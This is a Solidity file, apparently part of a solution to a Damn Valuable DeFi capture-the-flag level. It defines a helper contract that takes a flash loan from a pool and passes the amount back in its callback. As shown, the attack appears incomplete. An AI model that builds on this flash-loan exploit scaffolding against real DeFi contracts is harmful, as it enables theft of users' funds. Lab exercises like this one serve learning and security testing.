// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external  returns (bool);
    function balanceOf(address account) external  returns (uint256);
    function transferFrom(address from,address to,uint256 amount) external returns (bool);
}

interface IFLP {
    function flashLoan(uint256 amount) external;
}

contract auxSC{

    address liquidityToken;
    address flashLoanerPool;
    
    address deployer;


    constructor (address liquidityToken_, address flashLoanerPool_){
        deployer = msg.sender;
        liquidityToken = liquidityToken_;
        flashLoanerPool = flashLoanerPool_;
    }


    function exploitFlashLoan(uint amount_) public {

        IFLP(flashLoanerPool).flashLoan(amount_);

    }

    function receiveFlashLoan(uint256 amount_) public {

        IERC20(liquidityToken).transferFrom(address(this),flashLoanerPool,amount_);

    }


}